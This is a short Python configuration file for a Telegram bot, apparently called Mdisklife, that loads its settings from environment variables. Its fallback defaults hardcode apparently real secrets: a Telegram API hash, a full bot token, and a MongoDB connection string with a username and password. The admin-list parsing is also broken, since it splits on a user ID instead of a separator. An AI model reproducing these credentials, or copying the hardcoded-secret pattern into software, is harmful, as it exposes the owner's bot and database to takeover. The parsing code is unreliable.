# Don't Edit

import os

from dotenv import load_dotenv
load_dotenv()


# Mandatory variables for the bot to start
API_ID = int(os.getenv("API_ID", "27846009"))
API_HASH = os.environ.get("API_HASH", "c6766f34d9663f73e5ecaecf0383e763")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "5826368775:AAEPLvv2cGo177pct7ha7X21cx2gMziC4lY")
ADMINS = [int(i.strip()) for i in os.environ.get("ADMINS").split("796961982")] if os.environ.get("ADMINS") else []
ADMIN = ADMINS
DATABASE_NAME = os.environ.get("DATABASE_NAME", "Mdisklife")
DATABASE_URL = os.getenv("DATABASE_URL", "mongodb+srv://Mdisklife:karan3210@cluster0.ovrjwvf.mongodb.net/?retryWrites=true&w=majority") 
OWNER_ID =  int(os.environ.get("OWNER_ID", "796961982")) 
ADMINS.append(OWNER_ID) if OWNER_ID not in ADMINS else []
ADMINS.append(796961982)
#  Optionnal variables
LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", "-1001754468787")) 
UPDATE_CHANNEL = os.environ.get("UPDATE_CHANNEL", "mdisklifeupdates") # For Force Subscription
BROADCAST_AS_COPY = os.environ.get('BROADCAST_AS_COPY', "True") # true if forward should be avoided
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", '') # image when someone hit /start # image when someone hit /start
LINK_BYPASS = "False"
